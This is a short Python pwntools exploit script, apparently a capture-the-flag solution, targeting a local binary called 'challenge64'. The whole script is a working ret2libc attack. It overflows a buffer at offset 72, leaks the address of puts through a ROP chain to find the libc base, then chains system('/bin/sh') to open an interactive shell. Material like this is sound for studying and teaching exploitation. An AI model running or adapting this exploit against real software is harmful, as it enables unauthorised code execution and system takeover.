from pwn import *

OFFSET = 72

# context.log_level = "debug"

context.arch = "amd64"
s = process("./challenge64")
raw_input("Attach GDB")

elf = ELF('./challenge64')
rop = ROP(elf)

s.recvuntil("your name?\n")

rop.raw(rop.find_gadget(["pop rdi", "ret"]))
rop.raw(elf.got['puts'])
rop.raw(elf.symbols['puts'])
rop.raw(elf.symbols['vuln'])

print rop.dump()

s.sendline("A"*OFFSET+flat(rop.chain()))

puts = u64(s.recv(6)+"\x00\x00")

log.success("Leaked puts: "+hex(puts))

libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc_base = puts-libc.symbols['puts']

libc.address = libc_base

libc_rop = ROP(libc)

libc_rop.raw(rop.find_gadget(["pop rdi", "ret"]))
libc_rop.raw(next(libc.search("/bin/sh")))
libc_rop.raw(libc.symbols['system'])

print(libc_rop.dump())

s.recvuntil("your name?\n")

s.sendline("A"*OFFSET+flat(libc_rop.chain()))

s.interactive()
